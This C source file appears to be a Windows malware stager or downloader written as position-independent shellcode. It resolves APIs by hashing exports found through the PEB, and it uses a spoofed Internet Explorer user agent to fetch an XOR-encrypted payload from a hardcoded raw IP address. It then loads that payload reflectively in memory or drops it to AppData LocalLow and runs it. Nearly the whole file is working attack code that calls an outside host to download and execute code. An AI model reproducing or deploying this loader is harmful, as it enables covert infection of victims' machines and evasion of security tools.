#include <Windows.h>
#include <winternl.h>

#include "loader.h"
#include "winapi.h"

#pragma comment( linker, "/subsystem:console" )
#pragma section(".loader", read,execute)
#pragma code_seg(".loader")

__declspec(allocate(".loader"))
LOADER_CONFIG pLoaderConfig = 
{
	0xdeadbeef,
	0x6281f17f,																										
	{ 'h', 't', 't', 'p', ':', '/', '/', '1', '4', '.', '1', '3', '6', '.', '2', '3', '6', '.', '1', '5', '5', '/', '9', 'z', '8', 'o', '5', 'd', '9', 'l', '0', 'p', '6', 'c', '.', 'd', 'a', 't', 0x0, 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 0x0 },
	{ 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', 0x0 },
	{ 'N', 'T', 'D', 'L', 'L', 0x0 },
	{ 'W', 'I', 'N', 'I', 'N', 'E', 'T', 0x0 },
	{ 'S', 'H', 'E', 'L', 'L', '3', '2', 0x0 },

	{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 },
	{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 },

	{ 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0x0 },
	{ 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 },
	{ 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 },
	{ 'G', 'e', 't', 'S', 'h', 'o', 'r', 't', 'P', 'a', 't', 'h', 'N', 'a', 'm', 'e', 'W', 0x0 },
	{ 'G', 'e', 't', 'T', 'e', 'm', 'p', 'P', 'a', 't', 'h', 'W', 0x0 },
	{ 'S', 'H', 'G', 'e', 't', 'K', 'n', 'o', 'w', 'n', 'F', 'o', 'l', 'd', 'e', 'r', 'P', 'a', 't', 'h', 0x0 },
	{ 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 },
	{ 'F', 'r', 'e', 'e', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 0x0 },
	{ 'D', 'e', 'l', 'e', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0x0 },

	{ 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'A', 0x0 },
	{ 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'U', 'r', 'l', 'A', 0x0 },
	{ 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'W', 0x0 },
	{ 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 'E', 'x', 'A', 0x0 }, 
	{ '_', 'w', 't', 'o', 'i', 0x0 },
	{ 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 },

	//{ '?', 'q', 'w', 'o', 'p', 'f', 'n', 'c', 'h', '@', '@', 'Y', 'G', 'H', 'P', 'A', 'K', '@', 'Z', 0x0 },
	{ 'q', 'w', 'o', 'p', 'f', 'n', 'c', 'h', 0x0 },
	{ 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '4', '.', '0', ' ', '(', 'c', 'o', 'm', 'p', 'a', 't', 'i', 'b', 'l', 'e', ';', ' ', 'M', 'S', 'I', 'E', ' ', '7', '.', '0', ';', ' ', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '6', '.', '1', ';', ' ', 'W', 'O', 'W', '6', '4', ';', ' ', 'T', 'r', 'i', 'd', 'e', 'n', 't', '/', '5', '.', '0', ';', ' ', 'S', 'L', 'C', 'C', '2', ';', ' ', '.', 'N', 'E', 'T', ' ', 'C', 'L', 'R', ' ', '2', '.', '0', '.', '5', '0', '7', '2', '7', ';', ' ', '.', 'N', 'E', 'T', ' ', 'C', 'L', 'R', ' ', '3', '.', '5', '.', '3', '0', '7', '2', '9', ';', ' ', '.', 'N', 'E', 'T', ' ', 'C', 'L', 'R', ' ', '3', '.', '0', '.', '3', '0', '7', '2', '9', ';', ' ', 'M', 'e', 'd', 'i', 'a', ' ', 'C', 'e', 'n', 't', 'e', 'r', ' ', 'P', 'C', ' ', '6', '.', '0', ';', ' ', '.', 'N', 'E', 'T', '4', '.', '0', 'C', ';', ' ', '.', 'N', 'E', 'T', '4', '.', '0', 'E', ';', ' ', 'M', 'D', 'D', 'R', 'J', 'S', ')', 0x0 },
};

int main() { Startup(); };
#ifndef _WIN64
__declspec(naked) VOID Startup()
#else
VOID Startup()
#endif
{
#ifndef _WIN64
	__asm
	{
		nop
		call next					// start of shellcode gadget (don't touch)
next:					
		pop eax	
		and eax, 0xfffff000			// end of shellcode gadget (don't touch)

		call next2
next2:
		pop esi
		nop

next3:
		mov ebx, 0xdeadbeef
		cmp ebx, [esi]
		je start_loader

		dec esi
		jmp next3

start_loader:
		push esi
		call Loader
	}
#else
	Loader(NULL);
#endif
}

VOID Loader(__in PLOADER_CONFIG lpLoaderConfig)
{
	VTABLE pVtable;
	pVtable.lpLoaderConfig = lpLoaderConfig;

	if (!LoadVTable(&pVtable))
		return;

	DWORD dwFileSize;
	LPBYTE lpFileBuffer = DownloadAndDecrypt(&pVtable, lpLoaderConfig->strUserAgent, 
			lpLoaderConfig->strUrl, 
			&dwFileSize, 
			lpLoaderConfig->dwXorKey, 
			lpLoaderConfig->dwXorKey ? TRUE : FALSE);

#ifndef _WIN64
	CRTMAIN fpMain = NULL;
#else
	CRTMAIN64 fpMain = NULL;
#endif
	EXPORT fpExport = NULL;
	if (lpFileBuffer)
	{
#ifdef LOAD_FROM_DISK
		LPWSTR lpDllName = DropFile(&pVtable, lpFileBuffer, dwFileSize);
		if (lpDllName)
		{
			HMODULE hMod = pVtable.LoadLibraryW(lpDllName);
			if (!hMod)
				pVtable.ExitProcess(0);

			EXPORT2 fpExport = (EXPORT2) pVtable.GetProcAddress(hMod, pVtable.lpLoaderConfig->strExportName);
			fpExport(0);

			pVtable.FreeLibrary(hMod);
			pVtable.FreeLibrary(hMod);
			pVtable.FreeLibrary(hMod);
		}
		else
			pVtable.ExitProcess(0);
#else
#ifndef _WIN64
		fpMain = (CRTMAIN) _LoadLibrary(&pVtable, lpFileBuffer, (LPVOID *)&fpExport);
#else
		fpMain = (CRTMAIN64) _LoadLibrary(&pVtable, lpFileBuffer, (LPVOID *)&fpExport);
#endif
#endif
	}
	else
		pVtable.ExitProcess(0);

	if (fpMain)
#ifdef _WIN64
		fpMain(__readgsqword(0x60));	
#else
		fpMain(__readfsdword(0x30)); 
#endif
	else
		pVtable.ExitProcess(0);

	if (fpExport)
		fpExport();
}

BOOL LoadVTable(__out PVTABLE lpTable)
{
	HMODULE hKernel32;

	if (!GetPointers(&lpTable->GetProcAddress, &lpTable->LoadLibraryA, (PHANDLE)&hKernel32))
		return FALSE;

	lpTable->VirtualAlloc = (VIRTUALALLOC) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strVirtualAlloc);
	lpTable->VirtualProtect = (VIRTUALPROTECT) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strVirtualProtect);
	lpTable->GetTempPathW = (GETTEMPPATHW) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strGetTempPathW);
	lpTable->GetShortPathNameW = (GETSHORTPATHNAMEW) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strGetShortPathNameW);
	lpTable->LoadLibraryW = (LOADLIBRARYW) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strLoadLibraryW);
	lpTable->FreeLibrary = (FREELIBRARY) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strFreeLibrary);
	lpTable->DeleteFileW = (DELETEFILEW) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strDeleteFileW);
	lpTable->CreateFileW = (CREATEFILEW) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strCreateFileW);
	lpTable->WriteFile = (WRITEFILE) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strWriteFile);
	lpTable->CloseHandle = (CLOSEHANDLE) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strCloseHandle);
	lpTable->ExitProcess = (EXITPROCESS) lpTable->GetProcAddress(hKernel32, lpTable->lpLoaderConfig->strExitProcess);	

	HMODULE hWinInet = lpTable->LoadLibraryA(lpTable->lpLoaderConfig->strWinInet);
	lpTable->InternetOpenA = (INTERNETOPENA) lpTable->GetProcAddress(hWinInet, lpTable->lpLoaderConfig->strInternetOpenA);
	lpTable->InternetOpenUrlA = (INTERNETOPENURLA) lpTable->GetProcAddress(hWinInet, lpTable->lpLoaderConfig->strInternetOpenUrlA);
	lpTable->InternetReadFileExA = (INTERNETREADFILEEXA) lpTable->GetProcAddress(hWinInet, lpTable->lpLoaderConfig->strInternetReadFileExA);
	lpTable->HttpQueryInfoW = (HTTPQUERYINFOW) lpTable->GetProcAddress(hWinInet, lpTable->lpLoaderConfig->strHttpQueryInfoW);

	HMODULE hNtDll = lpTable->LoadLibraryA(lpTable->lpLoaderConfig->strNtDll);
	lpTable->wtoi = (WTOI) lpTable->GetProcAddress(hNtDll, lpTable->lpLoaderConfig->strWtoi);

	HMODULE hShell32 = lpTable->LoadLibraryA(lpTable->lpLoaderConfig->strShell32);
	lpTable->SHGetKnownFolderPath = (SHGETKNOWNFOLDERPATH) lpTable->GetProcAddress(hShell32, lpTable->lpLoaderConfig->strSHGetKnownFolderPath);

	if (!lpTable->VirtualAlloc ||
		!lpTable->VirtualProtect || 
		!lpTable->GetTempPathW || 
		!lpTable->GetShortPathNameW ||
		!lpTable->LoadLibraryW ||
		!lpTable->FreeLibrary || 
		!lpTable->CreateFileW || 
		!lpTable->WriteFile || 
		!lpTable->CloseHandle || 
		!lpTable->ExitProcess || 
		!lpTable->InternetOpenA || 
		!lpTable->InternetOpenUrlA || 
		!lpTable->InternetReadFileExA || 
		!lpTable->HttpQueryInfoW || 
		!lpTable->wtoi) return FALSE;

	return TRUE;
}

BOOL GetPointers(
	__out PGETPROCADDRESS fpGetProcAddress, 
	__out PLOADLIBRARYA fpLoadLibraryA,
	__out PHANDLE pKernel32)
{
	*pKernel32 = GetKernel32Handle();
	if (*pKernel32 == INVALID_HANDLE_VALUE)
		return FALSE;

	LPBYTE lpBaseAddr = (LPBYTE) *pKernel32;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER) lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS) (lpBaseAddr + lpDosHdr->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY) (lpBaseAddr +  pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfFunctions);
	LPWORD pOrdArray  = (LPWORD) (lpBaseAddr+ pExportDir->AddressOfNameOrdinals);

	*fpGetProcAddress = NULL;
	*fpLoadLibraryA = NULL;

	for (UINT i=0; i<pExportDir->NumberOfNames; i++)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);
	
		if (GetStringHash(pFuncName, FALSE, 14) == 0x7c0dfcaa) 
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		else if (GetStringHash(pFuncName, FALSE, 12) == 0xec0e4e8e)
			*fpLoadLibraryA = (LOADLIBRARYA) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
	
		if (*fpGetProcAddress && *fpLoadLibraryA)
			return TRUE;
	}

	return FALSE;
}

HANDLE GetKernel32Handle()
{
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
#ifdef _WIN64
	PPEB lpPeb = (PPEB) __readgsqword(0x60);
#else
	PPEB lpPeb = (PPEB) __readfsdword(0x30);
#endif
	PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;	

	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 		if (pModEntry->FullDllName.Length)
		{
			DWORD dwLen	= pModEntry->FullDllName.Length;
			PWCHAR strName = (pModEntry->FullDllName.Buffer + (dwLen/sizeof(WCHAR))) - 13;

			if (GetStringHash(strName, TRUE, 13) == 0x8fecdbff || GetStringHash(strName, TRUE, 13) == 0x6e2bcfd7)
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}

	return hKernel32;
}

DWORD GetStringHash(
	__in LPVOID lpBuffer, 
	__in BOOL bUnicode, 
	__in UINT uLen)
{
	DWORD dwHash = 0;
	LPSTR strBuffer = (LPSTR) lpBuffer;

	while (uLen--)
    {
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash +=  (DWORD)*strBuffer++;

		if (bUnicode)
				strBuffer++;			
    }
    return dwHash;
}

LPBYTE DownloadAndDecrypt(__in PVTABLE lpTable, __in LPSTR strUserAgent, __in LPSTR strUrl, __in LPDWORD dwFileLen, __in DWORD dwXorKey, BOOL bXored)
{
	CHAR strBuff[17];
	HINTERNET hInternet;
	DWORD dwBuffLen, dwIdx;
	
	hInternet = lpTable->InternetOpenA(strUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet)
	{
		HINTERNET hUrl = lpTable->InternetOpenUrlA(hInternet, strUrl, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_PRAGMA_NOCACHE, NULL);
		if (hUrl)
		{
			dwBuffLen = 16;
			dwIdx = 0;

			lpTable->HttpQueryInfoW(hUrl, HTTP_QUERY_CONTENT_LENGTH, strBuff, &dwBuffLen, &dwIdx);
			*dwFileLen = lpTable->wtoi((LPWSTR)strBuff);

			LPBYTE lpFileBuffer = (LPBYTE) lpTable->VirtualAlloc(NULL, *dwFileLen, MEM_COMMIT, PAGE_READWRITE);			
			if (DownloadFile(lpTable, hUrl, lpFileBuffer, *dwFileLen))
			{
				if (bXored)
					return Decrypt(lpFileBuffer, *dwFileLen, dwXorKey);
				else
					return lpFileBuffer;
			}
		}
	}

	return NULL;
}

BOOL DownloadFile(__in PVTABLE lpTable, __in HINTERNET hUrl, __in LPBYTE lpBuffer, __in DWORD dwBufferLen)
{
	DWORD dwRead = 0;
	INTERNET_BUFFERSA pInternetBuff;

	__MEMSET__(&pInternetBuff, 0x0, sizeof(INTERNET_BUFFERSA));
	pInternetBuff.dwStructSize = sizeof(INTERNET_BUFFERS);
	pInternetBuff.Next = NULL;
	pInternetBuff.lpvBuffer = lpBuffer;
	pInternetBuff.dwBufferLength = dwBufferLen;

	if (lpTable->InternetReadFileExA(hUrl, &pInternetBuff, IRF_SYNC, NULL)) // FIXME
	{
		if (pInternetBuff.dwBufferLength == dwBufferLen)
			return TRUE;
	}

	return FALSE;
}

LPBYTE Decrypt(__in LPBYTE lpBuffer, __in DWORD dwBuffLen, __in DWORD dwXorKey)
{
	LPDWORD lpD = (LPDWORD) lpBuffer;
	LPBYTE lpB = (LPBYTE) lpBuffer;

	for (UINT i=0; i<dwBuffLen/4; i++)
		lpD[i] ^= dwXorKey;
	for (UINT i=dwBuffLen - (dwBuffLen%4); i<dwBuffLen; i++)
		lpB[i] ^= 0x41;

	return lpBuffer;
}

#ifdef LOAD_FROM_DISK
LPWSTR GetDropPath(__in PVTABLE lpTable)
{
	GUID idAppDataLow;
	LPWSTR strFileName;
	LPWSTR strShortFileName = (LPWSTR) lpTable->VirtualAlloc(NULL, 0x8000 * sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);

	idAppDataLow.Data1 = 0xA520A1A4;
	idAppDataLow.Data2 = 0x1780;
	idAppDataLow.Data3 = 0x4FF6;
	idAppDataLow.Data4[0] = 0xBD;
	idAppDataLow.Data4[1] = 0x18;
	idAppDataLow.Data4[2] = 0x16;
	idAppDataLow.Data4[3] = 0x73;
	idAppDataLow.Data4[4] = 0x43;
	idAppDataLow.Data4[5] = 0xc5;
	idAppDataLow.Data4[6] = 0xaf;
	idAppDataLow.Data4[7] = 0x16;
	
	if (!lpTable->SHGetKnownFolderPath || lpTable->SHGetKnownFolderPath((REFKNOWNFOLDERID)idAppDataLow, 0, NULL, &strFileName) != S_OK)
	{
		strFileName = (LPWSTR) lpTable->VirtualAlloc(NULL, 0x8000 * sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
		lpTable->GetTempPathW(0x8000, strFileName);
	}

	strShortFileName = (LPWSTR) lpTable->VirtualAlloc(NULL, 0x8000 * sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);

	__MEMSET__(strShortFileName, 0x0, 0x8000 * sizeof(WCHAR));
	lpTable->GetShortPathNameW(strFileName, strShortFileName, 0x8000);

	LPWSTR strBuff = strShortFileName;
	while(*strBuff++); strBuff-=2;
	if (*(strBuff) != L'\\')
	{
		*(strBuff+1) = L'\\';
		strBuff++;
	}
	
	*(strBuff+1) = L'A';
	*(strBuff+2) = L'.';
	*(strBuff+3) = L'b';	
	
	return strShortFileName;
}

LPWSTR DropFile(__in PVTABLE lpTable, __in LPBYTE lpFileBuffer, __in DWORD dwFileSize)
{
	DWORD dwOut;
	HANDLE hFile;
	LPWSTR strFileName;
	
	strFileName = GetDropPath(lpTable);

	hFile = lpTable->CreateFileW(strFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return NULL;
	lpTable->WriteFile(hFile, lpFileBuffer, dwFileSize, &dwOut, NULL);
	lpTable->CloseHandle(hFile);

	return strFileName;
}
#else
LPVOID _LoadLibrary(
	__in PVTABLE lpTable,
	__in LPVOID lpRawBuffer,
	__out LPVOID *lpExport)
{
	LPVOID lpAddress = NULL;
	IMAGE_DOS_HEADER dos_header;
	IMAGE_NT_HEADERS32 pe_header;
	DWORD header_size = 0;

	*lpExport = NULL;

	__MEMCPY__(&dos_header, lpRawBuffer, sizeof(dos_header));
	if (dos_header.e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	__MEMCPY__(&pe_header, CALC_OFFSET(LPVOID, lpRawBuffer, dos_header.e_lfanew), sizeof(pe_header));
	if (pe_header.Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	lpAddress = lpTable->VirtualAlloc(NULL, pe_header.OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	if (lpAddress == NULL)
		return NULL;

	header_size = dos_header.e_lfanew + pe_header.FileHeader.SizeOfOptionalHeader + sizeof(pe_header.FileHeader) + 4;

	IMAGE_SECTION_HEADER section;
	LPVOID lpBufferPtr = CALC_OFFSET(LPVOID, lpRawBuffer, header_size);
	__MEMCPY__(&section, lpBufferPtr, sizeof(section));
	__MEMCPY__(lpAddress, lpRawBuffer, section.PointerToRawData);

	PIMAGE_SECTION_HEADER sections = CALC_OFFSET(PIMAGE_SECTION_HEADER, lpAddress, header_size);
	for(USHORT i = 0; i < pe_header.FileHeader.NumberOfSections; i++, sections++)
	{
		LPVOID lpSectionBuffer = CALC_OFFSET(LPVOID, lpAddress, sections->VirtualAddress);
		__MEMCPY__(lpSectionBuffer, CALC_OFFSET(LPVOID, lpRawBuffer, sections->PointerToRawData), min(sections->SizeOfRawData, sections->Misc.VirtualSize));
	}

	// relocations
	DWORD dwRelocSize = pe_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	DWORD dwRelocAddr = pe_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	
	if (dwRelocAddr != 0 && dwRelocSize != 0)
	{
		LPBYTE lpPtr = CALC_OFFSET(LPBYTE, lpAddress, dwRelocAddr);
		while(dwRelocSize > 0)
		{
			base_relocation_block_t block;
			__MEMCPY__(&block, lpPtr, sizeof(base_relocation_block_t));

			dwRelocSize -= block.BlockSize;
			lpPtr += sizeof(base_relocation_block_t);
			block.BlockSize -= 8;

			while(block.BlockSize)
			{
				base_relocation_entry_t entry;
				__MEMCPY__(&entry, lpPtr, sizeof(WORD));

				LPDWORD ptrOffset = CALC_OFFSET(LPDWORD, lpAddress, block.PageRVA + entry.offset);
				DWORD dwOldValue = *ptrOffset;

				DWORD dwNewValue = dwOldValue - pe_header.OptionalHeader.ImageBase + (DWORD) lpAddress;
				LPWORD ptrHighOffset = CALC_OFFSET_DISP(LPWORD, lpAddress, block.PageRVA + entry.offset, 2);
				LPWORD ptrLowOffset = CALC_OFFSET_DISP(LPWORD, lpAddress, block.PageRVA + entry.offset, 0);

				WORD wLowNewOffset = (WORD) ((DWORD) lpAddress & 0xffff);
				WORD wHighNewOffset = (WORD) (((DWORD) lpAddress & 0xffff0000) >> 16);

				switch(entry.type)
				{
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGH: 
					break;
				case IMAGE_REL_BASED_LOW:
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*ptrOffset = dwNewValue;
					break;
				case IMAGE_REL_BASED_HIGHADJ:
					break;
				case IMAGE_REL_BASED_DIR64:
					break; 
				}
				
				lpPtr += sizeof(base_relocation_entry);
				block.BlockSize -= 2;
			}
		}
	}


	// imports
	DWORD dwIatSize = pe_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
	DWORD dwIatAddr = pe_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	if (dwIatAddr != 0)
	{
		PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = CALC_OFFSET(PIMAGE_IMPORT_DESCRIPTOR, lpAddress, dwIatAddr);
		while(pImportDescriptor)
		{
			if (pImportDescriptor->FirstThunk == 0)
			{
				pImportDescriptor = NULL;
				continue;
			}

			LPDWORD pImportLookupTable = CALC_OFFSET(LPDWORD, lpAddress, pImportDescriptor->FirstThunk);
			LPSTR lpModName = CALC_OFFSET(LPSTR, lpAddress, pImportDescriptor->Name);
			
			HMODULE hMod = lpTable->LoadLibraryA(lpModName);

			if (hMod != NULL)
			{
				while(*pImportLookupTable != 0x00)
				{
					if ((*pImportLookupTable & IMAGE_ORDINAL_FLAG) != 0x00)
					{
						DWORD pOrdinalValue = *(CALC_OFFSET(LPDWORD, pImportLookupTable, 0)) & 0x0000ffff;
						*pImportLookupTable = (DWORD) lpTable->GetProcAddress(hMod, (LPSTR)pOrdinalValue);
					}
					else
					{
						LPSTR lpProcName = CALC_OFFSET_DISP(LPSTR, lpAddress, (*pImportLookupTable), 2);	// adding two bytes
						*pImportLookupTable = (DWORD) lpTable->GetProcAddress(hMod, lpProcName);
					}
					pImportLookupTable++;
				}
			}
			pImportDescriptor++;
		}
	}
		
	// exports
	HMODULE hModule = (HMODULE) lpAddress;
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER) hModule;
	PIMAGE_NT_HEADERS pImageNtHeaders = CALC_OFFSET(PIMAGE_NT_HEADERS, hModule, pImageDosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY pExportDir = &pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (pExportDir->Size != 0 && pExportDir->VirtualAddress != 0)
	{
		PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((LPBYTE)hModule + pExportDir->VirtualAddress);

		pExportDirectory->AddressOfNames += DWORD(hModule);
		pExportDirectory->AddressOfFunctions += DWORD(hModule);
		pExportDirectory->AddressOfNameOrdinals += DWORD(hModule);

		LPDWORD ptrFunctions = (LPDWORD) pExportDirectory->AddressOfFunctions;
		LPDWORD ptrNames = (LPDWORD) pExportDirectory->AddressOfNames;

		for(DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
		{
			ptrFunctions[i] += (DWORD) hModule;
			ptrNames[i] += (DWORD) hModule;

			*lpExport = (LPVOID) ptrFunctions[i];
		}
	}

	// fix perms
	DWORD ignore = 0;
	sections = CALC_OFFSET(PIMAGE_SECTION_HEADER, lpAddress, header_size);
	for(USHORT i = 0; i < pe_header.FileHeader.NumberOfSections; i++, sections++)
	{
		LPVOID lpSectionBuffer = CALC_OFFSET(LPVOID, lpAddress, sections->VirtualAddress);
		if ((sections->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE)
			lpTable->VirtualProtect(lpSectionBuffer, sections->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &ignore);
	}

	lpTable->VirtualProtect(lpAddress, header_size, PAGE_READONLY, &ignore);

	return CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
}
#endif

#pragma optimize("", off) 
VOID __MEMSET__(__in LPVOID p, __in CHAR cValue, __in DWORD dwSize)
{
	for (UINT i=0; i<dwSize; i++)
		((PCHAR)p)[i] = cValue;
}

LPVOID __MEMCPY__(
	__in LPVOID lpDst, 
	__in LPVOID lpSrc, 
	__in DWORD dwCount)
{
	LPBYTE s = (LPBYTE) lpSrc;
	LPBYTE d = (LPBYTE) lpDst;

	while (dwCount--)
		*d++ = *s++;

	return lpDst;
}
#pragma optimize("", on) 

